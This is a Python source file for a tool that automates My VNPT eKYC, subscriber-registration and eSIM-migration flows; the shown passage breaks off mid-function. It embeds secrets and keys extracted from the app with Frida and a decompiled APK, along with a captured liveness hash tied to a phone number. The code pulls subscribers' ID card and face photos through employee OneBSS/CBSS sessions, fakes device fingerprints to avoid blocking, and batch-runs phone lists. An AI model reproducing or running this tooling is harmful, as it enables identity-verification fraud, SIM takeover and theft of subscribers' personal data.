"""
ekyc_full.py - My VNPT eKYC Complete Flow
==========================================
STEP 1: getChallengeCodeSdkEkyc (My VNPT API)
STEP 2: Upload face images + Liveness detection (VNPT IDG API)
STEP 3: saveLogEkyc - Report results to MyVNPT

Confirmed from: Frida hooks + HTTP Toolkit + Source code analysis + decompiled APK
"""
import base64, hashlib, json, uuid, subprocess, re, secrets, string
import os, sys, requests, urllib3, ctypes, tempfile, threading, atexit, shutil, time
from pathlib import Path

# An cua so console tren Windows khi chay exe (chuyen xuong main)
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
from collections import OrderedDict
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import unpad, pad
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.serialization import load_der_public_key
from cryptography.hazmat.backends import default_backend
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context
import ssl

urllib3.disable_warnings()

# ===========================================================================
# CONFIG - hardcoded values (confirmed from APK source code analysis)
# ===========================================================================
# All config is now handled via API (initDevice + authen_msisdn) - no ADB needed
AES_MASTER_KEY  = "dqeqgig123ndb123dsfsdf23g4d56jfq"   # getKeyEncryptAES() - confirmed via Frida
SECRET_AUTHEN   = "05ca696sdg4533250c49bdf16a76ad247"   # getSecretAuthenKeySimOnline() - confirmed via Frida
AI_TOKEN        = "8928skjhfa89298jahga1771vbvb"         # Constants.AI_TOKEN (hardcoded in app)
MYVNPT_BASE     = "https://api-myvnpt.vnpt.vn"
IDG_BASE        = "https://api.idg.vnpt.vn"
IV_ZEROS        = bytes(16)

# eContract signing constants used by the My VNPT eSIM migration flow.  The
# APK does not put this OTP in createRequestChangeEsim/createContractEsim;
# it opens the eContract SDK after the draft contract has been created.  The
# For a customer-ready draft (LC_DRAFT_SUBMIT), the APK calls
# ``electronic-sign?signForm=OTP``, verifies the returned ``idSign`` through
# ``esignature-service/esign/{idSign}/verify``, then uploads signImg1 through
# ``esignature-service/esign/{idSign}/v2/sign``.  ``commit`` is the
# employee-side transition for LC_DRAFT/LC_DRAFT_COMMIT and is not valid for
# a My VNPT eSIM draft already in LC_DRAFT_SUBMIT.
ECONTRACT_BASE       = "https://api-hopdong.vnpt.vn"
ECONTRACT_CLIENT_ID  = "vnpt-myvnpt.client@econtract.vnpt.vn"
ECONTRACT_CLIENT_SECRET = "bTuFNAhQr9zFHEW28adQSLg3RqeKQuvx"
ECONTRACT_TOKEN_ID   = "99278cae-63ae-450f-9e64-bc6a84ba93cb"
ECONTRACT_TOKEN_KEY  = ("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHQ6yUzXB3y5NkCMy1mZAuZ"
                        "SBdLoi7vOCrGikcc8Lp3VqGXwyR6EIo6ioCWvEajiXX8sWzJgHJBT5pAbIOriLwwycMKgdIRxvpnB83P8F7rCS0OFVf9HGK5gPEbeuKbm1jg0GBRhVnKI+o"
                        "WmCkxZ9w6UjImRzxQX5mTEjxMc+BxQIDAQAB")

# ===========================================================================
# REAL CAMERA DATA - tu LocalStorage cua vnptemploy
# ===========================================================================
# configLivenessHash = real IDG hash tu camera session thanh cong
# (C0467a0.java: day la hash dung cho /ai/v1/face/mask + liveness-3d)
# DA TIM RA: v1 mask HTTP 200! Gio can dung hash cua CHINH CHU SDT
# -> Xoa hash cua employee (khong match 1314), dung face_owner.jpg
CONFIG_LIVENESS_HASH   = "zone4/idg20261030-0ced7972-9864-4a32-e063-62199f0ad57f/IDG01_c1ce5726-d430-11f1-824b-4100d9ba9e02"  # 0917130661 - 30/10/2026, score 0.868

# configClientSession = SESSION tu IDG SDK (HttpUtils.b() format)
CONFIG_CLIENT_SESSION  = "ANDROID_CPH2179_32_Device_3.6.6_16ec16d5609eed0e_1782787635312_com.vnp.myvinaphone"

# ONEBSS employee token de auto-fetch anh chan dung
ONEBSS_TOKEN           = ""  # De trong - dang nhap qua GUI hoac paste token
ONEBSS_DEVICE_ID       = "8f0504c6358008c9"

# ===========================================================================
# CONFIG GUI - ONEBSS Login + OTP + Search + Auto DKTTTB
# ===========================================================================
SOURCE_DIR = os.path.dirname(os.path.abspath(__file__))
_TOOLGSM_TRANSIENT_MODE = os.environ.get('TOOLGSM_TRANSIENT_MODE', '').strip() == '1'
if _TOOLGSM_TRANSIENT_MODE:
    # ToolGSM keeps subscriber images in anh/ beside the EXE. Give each bridge
    # process a separate workspace for pass/history/session intermediates.
    _transient_parent = os.environ.get('TOOLGSM_TRANSIENT_PARENT', '').strip() or None
    if _transient_parent:
        os.makedirs(_transient_parent, exist_ok=True)
    BASE_DIR = tempfile.mkdtemp(prefix='toolgsm_ekyc_', dir=_transient_parent)
    atexit.register(shutil.rmtree, BASE_DIR, True)
elif getattr(sys, 'frozen', False):
    _exe_dir = os.path.dirname(sys.executable)
    _source_parent = os.path.dirname(_exe_dir)
    # Khi bản build nằm trong ./dist cùng project với tele_bot_ekyc.py,
    # dùng chung thư mục dữ liệu với telebot thay vì tạo một bộ rời trong
    # dist (anh/history/pass, cấu hình và session). Nếu đem EXE sang thư
    # mục khác, mặc định vẫn portable cạnh EXE như trước.
    if (
        os.path.basename(_exe_dir).lower() == 'dist'
        and os.path.isfile(os.path.join(_source_parent, 'tele_bot_ekyc.py'))
    ):
        BASE_DIR = _source_parent
    else:
        BASE_DIR = _exe_dir
else:
    BASE_DIR = SOURCE_DIR

# The portable Windows Python runtime uses an isolated ``python._pth`` file.
# In that mode Python does not automatically add the launched script's folder
# to sys.path, so direct child runs must add it before importing sibling
# modules such as cbss_support.py and proxy_support.py.
if SOURCE_DIR not in sys.path:
    sys.path.insert(0, SOURCE_DIR)

from myvnpt_usage_history import (
    CATEGORIES as USAGE_HISTORY_CATEGORIES,
    HISTORY_ENDPOINT, HISTORY_OTP_ENDPOINT, HISTORY_OTP_SERVICE,
    HistoryOtpRequired, UsageHistoryError, category_view, display_row,
    history_request, parse_history_response, recent_months,
)

PASS_DIR = os.path.join(BASE_DIR, 'pass')
HISTORY_DIR = os.path.join(BASE_DIR, 'history')
os.makedirs(PASS_DIR, exist_ok=True)
os.makedirs(HISTORY_DIR, exist_ok=True)

# Keep generated eKYC result JSON files from growing forever.  Cleanup is
# limited to the known result-file naming scheme inside this app's history
# directory, and runs once at startup plus hourly while the app is open.
EKYC_RESULT_RETENTION_SECONDS = 24 * 60 * 60
_EKYC_RESULT_CLEANUP_STOP = threading.Event()


def _cleanup_expired_ekyc_result_files(now=None):
    cutoff = (time.time() if now is None else float(now)) - EKYC_RESULT_RETENTION_SECONDS
    removed = 0
    try:
        result_paths = Path(HISTORY_DIR).glob('ekyc_result*.json')
        for result_path in result_paths:
            if not re.fullmatch(r'ekyc_result(?:_[^/\\]+)?\.json', result_path.name,
                                flags=re.IGNORECASE):
                continue
            try:
                if result_path.is_file() and result_path.stat().st_mtime < cutoff:
                    result_path.unlink()
                    removed += 1
            except OSError:
                # Another process may be writing/removing the same result.
                continue
    except OSError:
        pass
    return removed


def _ekyc_result_cleanup_loop():
    while not _EKYC_RESULT_CLEANUP_STOP.wait(60 * 60):
        _cleanup_expired_ekyc_result_files()


_cleanup_expired_ekyc_result_files()
threading.Thread(target=_ekyc_result_cleanup_loop,
                 name='ekyc-result-cleanup', daemon=True).start()
atexit.register(_EKYC_RESULT_CLEANUP_STOP.set)

ONEBSS_BASE   = "https://api-onebss.vnpt.vn"
ONEBSS_APP_VERSION = "1.5.41.115"
ACCOUNT_STATE_DIR = os.environ.get('TOOLGSM_ACCOUNT_STATE_DIR', '').strip()
if ACCOUNT_STATE_DIR:
    os.makedirs(ACCOUNT_STATE_DIR, exist_ok=True)
CONFIG_JSON = os.path.join(
    ACCOUNT_STATE_DIR or HISTORY_DIR,
    'onebss_config.json',
)

# Device/API sessions are runtime secrets, not history output. Under ToolGSM,
# keep them inside the per-process workspace so the .NET caller can remove
# them even after a forced stop. Standalone runs use a private OS temp folder.
SESSION_TEMP_DIR = tempfile.mkdtemp(
    prefix=f'ekyc_full_session_{os.getpid()}_',
    dir=BASE_DIR if _TOOLGSM_TRANSIENT_MODE else None,
)
DEVICE_SESSION_JSON = os.path.join(SESSION_TEMP_DIR, 'device_session.json')
ACTIVE_SIM_SESSION_JSON = os.path.join(
    SESSION_TEMP_DIR, 'active_sim_device_session.json')
UPDATE_INFO_SESSION_JSON = os.path.join(
    SESSION_TEMP_DIR, 'update_info_device_session.json')
USAGE_HISTORY_SESSION_JSON = os.path.join(
    SESSION_TEMP_DIR, 'usage_history_device_session.json')
atexit.register(shutil.rmtree, SESSION_TEMP_DIR, True)

# Remove session secrets left in ``history`` by older versions. Current
# versions never use these persistent paths.
for _old_session in Path(HISTORY_DIR).glob('device_session*.json'):
    if re.fullmatch(r'device_session(?:_[0-9A-Za-z_-]+)?\.json', _old_session.name):
        try:
            _old_session.unlink()
        except OSError:
            pass

# ToolGSM keeps downloaded subscriber images beside ToolGSM.exe when the
# caller supplies an image directory. Standalone eKYC keeps its own anh/.
TEMP_FACES_DIR = (os.environ.get('TOOLGSM_IMAGE_DIR', '').strip()
                  or os.path.join(BASE_DIR, 'anh'))
os.makedirs(TEMP_FACES_DIR, exist_ok=True)

# CBSS truc tiep (phien web) va OneBSS (Bearer token) la hai he thong dang
# nhap khac nhau.  Runtime nay giu cookie CBSS rieng, khong dung chung token
# OneBSS de tranh UI bao dang nhap thanh cong nhung luong tai anh lai sai phien.
from cbss_support import (
    CBSS_BASE_URL,
    CbssRuntime,
    split_combined_password as _split_cbss_combined_password,
)

CBSS_ACCOUNTS_JSON = os.path.join(
    ACCOUNT_STATE_DIR or BASE_DIR,
    'cbss_accounts.json' if ACCOUNT_STATE_DIR else 'accounts.json',
)
_CBSS_RUNTIME = CbssRuntime(CBSS_ACCOUNTS_JSON, CBSS_BASE_URL)

from proxy_support import ProxyConfigError, RotatingProxyManager

PROXY_CONFIG_JSON = os.path.join(HISTORY_DIR, 'proxy_config.json')
proxy_manager = RotatingProxyManager(PROXY_CONFIG_JSON)

FILE_DIRS = {
    'data.txt': PASS_DIR,
    'complete.txt': HISTORY_DIR,
    'complete_vua_xac_thuc.txt': HISTORY_DIR,
    'complete_khong_can_xac_thuc.txt': HISTORY_DIR,
    'fail.txt': HISTORY_DIR,
}
FIXED_TXT_IMPORT_PASSWORD = '123456a@A'
for file_name, file_dir in FILE_DIRS.items():
    file_path = os.path.join(file_dir, file_name)
    if not os.path.exists(file_path):
        with open(file_path, 'w', encoding='utf-8') as f:
            if file_name == 'data.txt':
                f.write(f"# Moi dong mot SDT; mat khau tu dong: {FIXED_TXT_IMPORT_PASSWORD}\n")
            elif file_name == 'complete.txt':
                f.write("# Danh sach DKTTTB THANH CONG - TONG\n")
            elif file_name == 'complete_vua_xac_thuc.txt':
                f.write("# Danh sach DKTTTB THANH CONG - VUA XAC THUC\n")
            elif file_name == 'complete_khong_can_xac_thuc.txt':
                f.write("# Danh sach DKTTTB THANH CONG - KHONG CAN XAC THUC\n")
            elif file_name == 'fail.txt':
                f.write("# Danh sach DKTTTB THAT BAI\n")

_RESULT_TXT_LOCK = threading.RLock()


def _migrate_legacy_result_files():
    """Preserve the old already-completed bucket in the new result layout."""
    complete_path = os.path.join(HISTORY_DIR, 'complete.txt')
    legacy_path = os.path.join(HISTORY_DIR, 'complete_chua_bi_khoa.txt')
    no_auth_path = os.path.join(HISTORY_DIR, 'complete_khong_can_xac_thuc.txt')
    with _RESULT_TXT_LOCK:
        if os.path.exists(legacy_path):
            def _read_unique_rows(*source_paths):
                rows = []
                seen = set()
                for source_path in source_paths:
                    try:
                        with open(source_path, 'r', encoding='utf-8-sig') as source_file:
                            for raw_line in source_file:
                                value = raw_line.strip()
                                if not value or value.startswith('#') or value in seen:
                                    continue
                                seen.add(value)
                                rows.append(value)
                    except OSError:
                        continue
                return rows

            def _replace_result_file(path, header, rows):
                part_path = f'{path}.{secrets.token_hex(4)}.migrate'
                try:
                    with open(part_path, 'w', encoding='utf-8', newline='\n') as output_file:
                        output_file.write(header + '\n')
                        for value in rows:
                            output_file.write(value + '\n')
                        output_file.flush()
                        os.fsync(output_file.fileno())
                    os.replace(part_path, path)
                finally:
                    if os.path.exists(part_path):
                        try:
                            os.remove(part_path)
                        except OSError:
                            pass

            legacy_rows = _read_unique_rows(legacy_path)
            total_rows = _read_unique_rows(complete_path, legacy_path)
            no_auth_rows = _read_unique_rows(no_auth_path, legacy_path)
            _replace_result_file(
                complete_path,
                '# Danh sach DKTTTB THANH CONG - TONG',
                total_rows,
            )
            _replace_result_file(
                no_auth_path,
                '# Danh sach DKTTTB THANH CONG - KHONG CAN XAC THUC',
                no_auth_rows,
            )
            if legacy_rows or os.path.isfile(legacy_path):
                os.remove(legacy_path)

        # These were redundant result exports in older builds.
        for obsolete_name in ('results.txt', 'results.xlsx'):
            obsolete_path = os.path.join(HISTORY_DIR, obsolete_name)
            if os.path.isfile(obsolete_path):
                try:
                    os.remove(obsolete_path)
                except OSError:
                    pass


_migrate_legacy_result_files()


def _append_txt_result(phone, success, already_completed=False, error_reason=''):
    """Append one DKTTTB result to the aggregate and matching detail file.

    Every success goes to ``complete.txt``. A newly verified success also goes
    to ``complete_vua_xac_thuc.txt``; an account completed earlier goes to
    ``complete_khong_can_xac_thuc.txt``. Failures go only to ``fail.txt``.
    Failed rows include a one-line reason: ``phone | reason``.
    """
    normalized_phone = str(phone or '').strip()
    if not normalized_phone:
        normalized_phone = '(khong ro so)'
    if success:
        result_line = normalized_phone
        detail_file_name = (
            'complete_khong_can_xac_thuc.txt'
            if already_completed else
            'complete_vua_xac_thuc.txt'
        )
        file_names = ('complete.txt', detail_file_name)
    else:
        normalized_reason = re.sub(r'\s+', ' ', str(error_reason or '')).strip()
        if not normalized_reason:
            normalized_reason = 'KHONG RO LY DO'
        # Keep one failed account on one physical TXT line and cap unexpected
        # HTML/trace payloads so a server error cannot flood the result file.
        result_line = f'{normalized_phone} | {normalized_reason[:1000]}'
        file_names = ('fail.txt',)

    primary_path = os.path.join(HISTORY_DIR, file_names[0])
    for file_name in file_names:
        path = os.path.join(HISTORY_DIR, file_name)
        last_error = None
        for attempt in range(5):
            try:
                with _RESULT_TXT_LOCK:
                    os.makedirs(HISTORY_DIR, exist_ok=True)
                    if not os.path.exists(path):
                        header = {
                            'complete.txt': '# Danh sach DKTTTB THANH CONG - TONG',
                            'complete_vua_xac_thuc.txt': '# Danh sach DKTTTB THANH CONG - VUA XAC THUC',
                            'complete_khong_can_xac_thuc.txt': '# Danh sach DKTTTB THANH CONG - KHONG CAN XAC THUC',
                            'fail.txt': '# Danh sach DKTTTB THAT BAI',
                        }[file_name]
                        with open(path, 'w', encoding='utf-8', newline='\n') as result_file:
                            result_file.write(header + '\n')
                    with open(path, 'a', encoding='utf-8', newline='\n') as result_file:
                        result_file.write(result_line + '\n')
                        result_file.flush()
                        os.fsync(result_file.fileno())
                break
            except OSError as exc:
                last_error = exc
                time.sleep(0.05 * (attempt + 1))
        else:
            raise last_error
    return primary_path


def _parse_txt_batch_lines(lines, fixed_password=FIXED_TXT_IMPORT_PASSWORD):
    """Parse TXT batch input; only the first phone field is used.

    A plain phone per line is the preferred format. Old ``SDT|PASS`` files
    remain accepted, but their password column is intentionally ignored so
    every imported account uses the configured fixed password.
    """
    accounts = []
    bad = 0
    for raw_line in lines:
        line = str(raw_line or '').strip()
        if not line or line.startswith('#'):
            continue
        phone = re.split(r'[|,;\t\s]+', line, maxsplit=1)[0].strip()
        if phone.upper() in ('SDT', 'SĐT', 'ST', 'PHONE'):
            continue
        if phone:
            accounts.append((phone, fixed_password))
        else:
            bad += 1
    return accounts, bad

# Auto-create persistent configuration only. Device sessions are created in
# SESSION_TEMP_DIR on demand and cleaned when the application exits.
for json_file in [CONFIG_JSON]:
    if not os.path.exists(json_file):
        with open(json_file, 'w', encoding='utf-8') as f:
            f.write('{}')

# Auto-create data.xlsx
DEFAULT_EXCEL_FILE = os.path.join(PASS_DIR, 'data.xlsx')
if not os.path.exists(DEFAULT_EXCEL_FILE):
    try:
        import openpyxl
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "Accounts"
        ws['A1'] = "SDT"
        ws['B1'] = "PASS"
        wb.save(DEFAULT_EXCEL_FILE)
    except ImportError:
        pass

def _load_saved_config():
    """Doc token da luu tu onebss_config.json"""
    try:
        if os.path.exists(CONFIG_JSON):
            with open(CONFIG_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {}

def _save_config(token, device_id, username=None, password=None):
    """Luu token + danh sach tai khoan vao onebss_config.json"""
    try:
        # Doc du lieu hien tai de merge
        old = _load_saved_config()
        accounts = old.get('accounts', [])
        # Them hoac cap nhat tai khoan moi
        if username and password:
            # Xoa tai khoan cu neu trung username
            accounts = [a for a in accounts if a.get('u') != username]
            accounts.insert(0, {'u': username, 'p': password})  # them vao dau list
            accounts = accounts[:10]  # giu toi da 10 tai khoan
        data = {'token': token, 'device_id': device_id, 'accounts': accounts,
                'last_user': username or old.get('last_user','')}
        with open(CONFIG_JSON, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"  [CONFIG] Khong luu duoc: {e}")

# Auto-load token da luu
_saved = _load_saved_config()
if _saved.get('token'):
    ONEBSS_TOKEN    = _saved['token']
    ONEBSS_DEVICE_ID = _saved.get('device_id', ONEBSS_DEVICE_ID)

_ONEBSS_SESSION = {'token': ONEBSS_TOKEN, 'device_id': ONEBSS_DEVICE_ID, 'secret_code': ''}

def _load_session_data():
    """Doc device session da luu tu device_session.json"""
    try:
        if os.path.exists(DEVICE_SESSION_JSON):
            with open(DEVICE_SESSION_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
    except: pass
    return {}

def _save_session_data(collected):
    """Luu session data tu Frida/ADB vao device_session.json."""
    keys = ['BEARER_TOKEN','DEVICE_INFO','MAC_ADDRESS','AES_MASTER_KEY','SECRET_AUTHEN',
            'rsa_key_private','server_public_key','login_session','API_SESSION_ID',
            'phone_number_login','API_MSISDN','API_MSISDN_LOGIN',
            'MSISDN_CHALLENGE_CODE','API_TOKEN_CHALLENGE_CODE',
            'LIMIT_TIME_CHALLENGE_CODE','Authorization','Device-Info','mac-address',
            'KEY_ENCRYPT_AES','SECRET_AUTHEN_KEY','TOKEN_BEARER','API_ACCESS_TOKEN']
    data = {k: collected.get(k,'') for k in keys if collected.get(k,'')}
    data['_saved_at'] = __import__('time').strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(DEVICE_SESSION_JSON, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        print(f"  [SESSION] Da luu device_session.json ({len(data)} fields)")
    except Exception as e:
        print(f"  [SESSION] Loi luu: {e}")


def _token_status(token):
    """Luon tra ve True - bo logic check het han."""
    try:
        payload = token.split('.')[1]
        payload += '=' * (-len(payload) % 4)
        info = json.loads(base64.b64decode(payload).decode('utf-8', errors='replace'))
        username = info.get('user_name') or info.get('sub', '?')
    except:
        username = '?'
    return True, 'Token da cap nhat', username

def _make_app_secret(device_id):
    obj = {'device_id': device_id, 'device_ip': 'Unknown', 'device_name': 'Web-Browser',
           'mac_address': 'Unknown', 'mobile_id': 'web-generated-id',
           'app_id': '1', 'app_version': ONEBSS_APP_VERSION, 'os_version': 'Android'}
    return base64.b64encode(json.dumps(obj, separators=(',', ':')).encode()).decode()

def _random_device_profile():
    """Sinh ngau nhien thong tin thiet bi cho 1 luong - tranh fingerprint bi chn."""
    import random, string, uuid as _uuid_mod
    # Pool dien thoai pho bien tai VN
    _MODELS = [
        ('V2057',    '11'),  # Oppo Find X3 Pro
        ('CPH2179',  '11'),  # Oppo A55
        ('V2206',    '12'),  # Oppo A96
        ('SM-A037F', '12'),  # Samsung A03s
        ('M2103K19G','11'),  # Xiaomi Redmi 10C
        ('RMX3430',  '12'),  # Realme C35
        ('SM-A135F', '12'),  # Samsung A13
        ('CPH2269',  '12'),  # Oppo A95
        ('SM-A225F', '11'),  # Samsung A22
        ('RMX3195',  '11'),  # Realme C21Y
        ('SM-A536B', '13'),  # Samsung A53
        ('V2218',    '12'),  # Oppo A77
        ('CPH2325',  '12'),  # Oppo A57
        ('M2012K11AG','12'), # Xiaomi Redmi Note 10
    ]
    model, android_ver = random.choice(_MODELS)
    dev_uuid  = str(_uuid_mod.uuid4())
    # FCM token gia lap Firebase format (168 chars)
    fcm_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_:'
    fcm_token = ''.join(random.choices(fcm_chars, k=168))
    # MAC address gia lap (16 hex chars)
    mac = ''.join(random.choices('0123456789abcdef', k=16))
    # Device-Info header
    di = f'{dev_uuid}|{dev_uuid}|unknown|Android||3.3.99.Prd|{model}|{android_ver}|'
    return {
        'uuid': dev_uuid, 'model': model, 'android_ver': android_ver,
        'fcm_token': fcm_token, 'mac': mac, 'di': di,
    }


def _onebss_headers(token, device_id):
    return {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'app-secret': _make_app_secret(device_id),
        'authorization': f'Bearer {token}',
        'selectedmenuid': '810241'
    }


def _cccd_file_paths(phone_fmt):
    """Return the local paths used for CCCD front (type 1) and back (type 2)."""
    safe_phone = re.sub(r'[^0-9A-Za-z_-]', '_', str(phone_fmt or 'unknown'))
    return (
        os.path.join(TEMP_FACES_DIR, f'{safe_phone}_cccd_front.jpg'),
        os.path.join(TEMP_FACES_DIR, f'{safe_phone}_cccd_back.jpg'),
    )


def _valid_cached_image(path):
    try:
        return bool(path and os.path.isfile(path) and os.path.getsize(path) > 2048)
    except OSError:
        return False


def fetch_images_from_cbss_direct(phone, log_cb=print):
    """Tai anh (mat truoc, mat sau, chan dung) bang phien web CBSS."""
    phone_84 = _esim_normalize_msisdn(phone)
    if not phone_84:
        raise EsimRegistrationError('phone is required for direct CBSS lookup')
    phone_fmt = '0' + phone_84[2:] if phone_84.startswith('84') else phone_84
    front_path, back_path = _cccd_file_paths(phone_fmt)
    portrait_path = os.path.join(TEMP_FACES_DIR, f'{phone_fmt}.jpg')
    log_cb(f'[CBSS-DIRECT] Tra cuu anh thue bao {phone_84} qua CBSS web...')

    res = {'front': '', 'back': '', 'portrait': ''}
    with tempfile.TemporaryDirectory(prefix='cbss_img_', dir=BASE_DIR) as temp_dir:
        try:
            downloaded = _CBSS_RUNTIME.download_images(phone_84, temp_dir)
            files = downloaded.get('files') or []
            for f in files:
                f_path = Path(f)
                if not f_path.is_file() or f_path.stat().st_size <= 2048:
                    continue
                image_stem = f_path.stem.lower()
                content = f_path.read_bytes()
                if image_stem == f'{phone_84}_front':
                    front_path_actual = front_path
                    Path(front_path_actual).write_bytes(content)
                    res['front'] = front_path_actual
                    log_cb(f'[CBSS-DIRECT] Da luu CCCD mat truoc: {len(content)//1024}KB -> {os.path.basename(front_path_actual)}')
                elif image_stem == f'{phone_84}_back':
                    back_path_actual = back_path
                    Path(back_path_actual).write_bytes(content)
                    res['back'] = back_path_actual
                    log_cb(f'[CBSS-DIRECT] Da luu CCCD mat sau: {len(content)//1024}KB -> {os.path.basename(back_path_actual)}')
                elif image_stem == phone_84:
                    # CBSS numbers the third distinct image as the portrait.
                    # Later images (_04, _05, ...) are other documents and
                    # must never overwrite the subscriber's face photo.
                    Path(portrait_path).write_bytes(content)
                    res['portrait'] = portrait_path
                    log_cb(f'[CBSS-DIRECT] Da luu anh chan dung: {len(content)//1024}KB -> {os.path.basename(portrait_path)}')
                else:
                    log_cb(f'[CBSS-DIRECT] Bo qua anh ho so bo sung: {f_path.name}')
        except Exception as exc:
            log_cb(f'[CBSS-DIRECT] download_images that bai: {exc}; thu tai anh chan dung...')
            try:
                downloaded = _CBSS_RUNTIME.download_portrait(phone_84, temp_dir)
                source = Path(downloaded.get('path', ''))
                if source.is_file() and source.stat().st_size > 2048:
                    content = source.read_bytes()
                    Path(portrait_path).write_bytes(content)
                    res['portrait'] = portrait_path
                    log_cb(f'[CBSS-DIRECT] Da luu anh chan dung: {len(content)//1024}KB -> {os.path.basename(portrait_path)}')
            except Exception as exc2:
                log_cb(f'[CBSS-DIRECT] download_portrait that bai: {exc2}')

    return {
        'front': res['front'] if _valid_cached_image(res.get('front')) else '',
        'back': res['back'] if _valid_cached_image(res.get('back')) else '',
        'portrait': res['portrait'] if _valid_cached_image(res.get('portrait')) else '',
    }


def _find_cccd_front(phone, preferred=''):
    """Resolve CCCD front image from local anh folder."""
    candidates = []
    if preferred:
        candidates.append(str(preferred))
    digits = re.sub(r'\D', '', str(phone or ''))
    phone_fmt = digits
    if digits.startswith('84') and len(digits) > 10:
        phone_fmt = '0' + digits[2:]
    elif digits and not digits.startswith('0'):
        phone_fmt = '0' + digits
    stems = [
        f'{phone_fmt}_cccd_front', f'{phone_fmt}_front', f'{phone_fmt}_1',
        f'{digits}_cccd_front', f'{digits}_front', f'{digits}_1',
        'cccd_front', 'front', 'mat_truoc', 'truoc'
    ]
    for stem in stems:
        if not stem:
            continue
        for ext in ('.jpg', '.jpeg', '.png', '.JPG', '.JPEG', '.PNG'):
            candidates.append(os.path.join(TEMP_FACES_DIR, f'{stem}{ext}'))
    seen = set()
    for path in candidates:
        normalized = os.path.normcase(os.path.abspath(path))
        if normalized in seen:
            continue
        seen.add(normalized)
        try:
            if os.path.isfile(path) and os.path.getsize(path) > 2048:
                return path
        except OSError:
            pass
    return ''


def _find_cccd_back(phone, preferred=''):
    """Resolve CCCD back image from local anh folder."""
    candidates = []
    if preferred:
        candidates.append(str(preferred))
    digits = re.sub(r'\D', '', str(phone or ''))
    phone_fmt = digits
    if digits.startswith('84') and len(digits) > 10:
        phone_fmt = '0' + digits[2:]
    elif digits and not digits.startswith('0'):
        phone_fmt = '0' + digits
    stems = [
        f'{phone_fmt}_cccd_back', f'{phone_fmt}_back', f'{phone_fmt}_2',
        f'{digits}_cccd_back', f'{digits}_back', f'{digits}_2',
        'cccd_back', 'back', 'mat_sau', 'sau'
    ]
    for stem in stems:
        if not stem:
            continue
        for ext in ('.jpg', '.jpeg', '.png', '.JPG', '.JPEG', '.PNG'):
            candidates.append(os.path.join(TEMP_FACES_DIR, f'{stem}{ext}'))
    seen = set()
    for path in candidates:
        normalized = os.path.normcase(os.path.abspath(path))
        if normalized in seen:
            continue
        seen.add(normalized)
        try:
            if os.path.isfile(path) and os.path.getsize(path) > 2048:
                return path
        except OSError:
            pass
    return ''


def _find_esim_portrait(phone, preferred=''):
    """Resolve the portrait used by eSIM eKYC from the local ``anh`` folder.

    The GUI/DKTTTB downloader stores portraits by subscriber number, while
    older runs used ``face_owner.jpg``.  Accept both formats (and the common
    ``sdt.jpg`` alias) so eSIM never falls through to a stale legacy filename.
    """
    candidates = []
    if preferred:
        candidates.append(str(preferred))
    digits = re.sub(r'\D', '', str(phone or ''))
    phone_fmt = digits
    if digits.startswith('84') and len(digits) > 10:
        phone_fmt = '0' + digits[2:]
    elif digits and not digits.startswith('0'):
        phone_fmt = '0' + digits
    stems = [
        phone_fmt, digits,
        f'{phone_fmt}_3', f'{digits}_3',
        f'{phone_fmt}_portrait', f'{digits}_portrait',
        'sdt', 'face_owner', 'portrait', 'chan_dung', 'face'
    ]
    for stem in stems:
        if not stem:
            continue
        for ext in ('.jpg', '.jpeg', '.png', '.JPG', '.JPEG', '.PNG'):
            candidates.append(os.path.join(TEMP_FACES_DIR, f'{stem}{ext}'))

    seen = set()
    for path in candidates:
        normalized = os.path.normcase(os.path.abspath(path))
        if normalized in seen:
            continue
        seen.add(normalized)
        try:
            if os.path.isfile(path) and os.path.getsize(path) > 2048:
                return path
        except OSError:
            pass
    return ''


def _image_bytes_from_onebss(item, headers=None, proxies=None):
    """Extract image bytes from one ONEBSS image record (base64 or URL)."""
    if not isinstance(item, dict):
        return b''
    b64_data = item.get('image_base') or item.get('base64') or ''
    if isinstance(b64_data, str) and b64_data:
        # Some responses include a data URI prefix.
        if ',' in b64_data and b64_data.lower().startswith('data:'):
            b64_data = b64_data.split(',', 1)[1]
        try:
            raw = base64.b64decode(b64_data + ('=' * (-len(b64_data) % 4)))
            if len(raw) > 2048:
                return raw
        except (ValueError, TypeError):
            pass

    img_url = item.get('url') or item.get('image_url') or ''
    if not isinstance(img_url, str) or not img_url:
        return b''
    if img_url.startswith('//'):
        img_url = 'https:' + img_url
    elif img_url.startswith('/'):
        img_url = ONEBSS_BASE + img_url
    try:
        response = requests.get(img_url, headers=headers, timeout=60,
                                verify=False, proxies=proxies)
        return response.content if len(response.content) > 2048 else b''
    except Exception:
        return b''


def _onebss_image_name(item):
    """Return the server filename/URL used to identify an Employ image."""
    if not isinstance(item, dict):
        return ''
    for key in (
        'image_name', 'imageName', 'file_name', 'fileName', 'filename',
        'name', 'url', 'image_url',
    ):
        value = item.get(key)
        if isinstance(value, str) and value.strip():
            return value.strip()
    return ''


def _onebss_filename_is_type3(value):
    """Recognize names such as 84816796305_3_20260523_080833.jpg."""
    name = str(value or '').split('?', 1)[0].split('#', 1)[0]
    name = name.replace('\\', '/').rsplit('/', 1)[-1]
    return bool(re.search(r'(?:^|[_-])3(?:[_-]|\.|$)', name, re.IGNORECASE))


def _select_onebss_type3_image(images):
    """Select the Employ portrait by filename first, then explicit type=3."""
    if not isinstance(images, list):
        return None

    # The actual Employ payload encodes the image kind in names such as
    # ``<phone>_3_<timestamp>.jpg``. Array order is not stable.
    for item in images:
        if isinstance(item, dict) and _onebss_filename_is_type3(
                _onebss_image_name(item)):
